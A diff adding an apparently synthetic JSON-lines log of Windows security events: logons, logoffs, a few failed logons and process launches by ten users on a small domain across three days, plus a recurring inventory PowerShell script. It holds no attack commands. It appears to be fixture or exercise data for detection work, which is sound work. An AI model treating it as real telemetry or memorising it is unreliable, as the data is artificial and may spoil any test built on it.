@@ -1,0 +1,319 @@
+{"@timestamp": "2026-10-25T19:33:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-25T20:13:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
+{"@timestamp": "2026-10-26T03:01:11Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-26T03:02:10Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.3.13", "LogonType": 2}}
+{"@timestamp": "2026-10-26T03:11:41Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:15:05Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:23:31Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:26:05Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.3.18", "LogonType": 2}}
+{"@timestamp": "2026-10-26T03:35:18Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:37:15Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.3.14", "LogonType": 2}}
+{"@timestamp": "2026-10-26T03:46:22Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:48:53Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:54:18Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T03:59:46Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:00:04Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:07:04Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:12:34Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:13:52Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:19:15Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.3.15", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:25:27Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:45:33Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.3.16", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:45:54Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:48:20Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "heidi", "IpAddress": "10.10.3.17", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:49:30Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:50:53Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.3.12", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:52:23Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:53:00Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:57:00Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T04:58:44Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.3.19", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:59:04Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.3.19", "LogonType": 2}}
+{"@timestamp": "2026-10-26T04:59:17Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:03:24Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:04:17Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:10:37Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:12:29Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:21:32Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:24:02Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:27:25Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:28:07Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:32:16Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:36:38Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:43:18Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T05:49:04Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-26T06:45:33Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1"}}
+{"@timestamp": "2026-10-26T10:06:07Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "dave"}}
+{"@timestamp": "2026-10-26T10:58:08Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "ivan"}}
+{"@timestamp": "2026-10-26T11:57:51Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-10-26T12:05:05Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "erin"}}
+{"@timestamp": "2026-10-26T12:07:09Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "carol"}}
+{"@timestamp": "2026-10-26T12:54:34Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "bob"}}
+{"@timestamp": "2026-10-26T13:02:15Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "frank"}}
+{"@timestamp": "2026-10-26T13:04:34Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "heidi"}}
+{"@timestamp": "2026-10-26T13:24:16Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "judy"}}
+{"@timestamp": "2026-10-26T13:32:02Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "grace"}}
+{"@timestamp": "2026-10-26T19:32:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-26T20:12:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
+{"@timestamp": "2026-10-27T03:07:30Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.3.15", "LogonType": 2}}
+{"@timestamp": "2026-10-27T03:08:47Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.3.12", "LogonType": 2}}
+{"@timestamp": "2026-10-27T03:11:20Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:26:40Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:28:40Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:29:38Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:38:11Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.3.18", "LogonType": 2}}
+{"@timestamp": "2026-10-27T03:42:17Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:44:27Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:46:25Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:47:23Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T03:50:20Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.3.14", "LogonType": 2}}
+{"@timestamp": "2026-10-27T03:52:15Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:04:30Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.3.13", "LogonType": 2}}
+{"@timestamp": "2026-10-27T04:08:21Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-27T04:09:07Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:12:54Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:13:19Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:15:21Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.3.19", "LogonType": 2}}
+{"@timestamp": "2026-10-27T04:15:43Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:19:08Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:20:39Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:22:10Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "heidi", "IpAddress": "10.10.3.17", "LogonType": 2}}
+{"@timestamp": "2026-10-27T04:23:06Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-27T04:23:42Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:36:19Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:46:41Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:46:55Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:49:58Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.3.16", "LogonType": 2}}
+{"@timestamp": "2026-10-27T04:50:27Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T04:57:47Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:00:06Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:01:45Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:01:56Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:02:27Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:04:13Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:16:02Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:16:04Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:21:28Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T05:27:00Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-27T06:49:58Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1"}}
+{"@timestamp": "2026-10-27T10:09:32Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "frank"}}
+{"@timestamp": "2026-10-27T10:48:50Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "carol"}}
+{"@timestamp": "2026-10-27T11:56:03Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "grace"}}
+{"@timestamp": "2026-10-27T12:13:02Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "dave"}}
+{"@timestamp": "2026-10-27T12:15:07Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "ivan"}}
+{"@timestamp": "2026-10-27T12:19:58Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "erin"}}
+{"@timestamp": "2026-10-27T12:56:28Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "judy"}}
+{"@timestamp": "2026-10-27T13:05:44Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-10-27T13:08:18Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "bob"}}
+{"@timestamp": "2026-10-27T13:19:56Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "heidi"}}
+{"@timestamp": "2026-10-27T19:31:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-27T20:11:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
+{"@timestamp": "2026-10-28T03:06:34Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.3.19", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:17:23Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.3.18", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:20:46Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:21:06Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:21:52Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:22:42Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:28:02Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:32:03Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:36:50Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:43:30Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:45:27Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:46:50Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:51:28Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.3.15", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:51:48Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.3.15", "LogonType": 2}}
+{"@timestamp": "2026-10-28T03:59:15Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T03:59:48Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:04:31Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:06:47Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:07:24Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:13:06Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:17:56Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "heidi", "IpAddress": "10.10.3.17", "LogonType": 2}}
+{"@timestamp": "2026-10-28T04:18:04Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.3.14", "LogonType": 2}}
+{"@timestamp": "2026-10-28T04:28:50Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.3.12", "LogonType": 2}}
+{"@timestamp": "2026-10-28T04:30:03Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.3.16", "LogonType": 2}}
+{"@timestamp": "2026-10-28T04:30:16Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:35:41Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
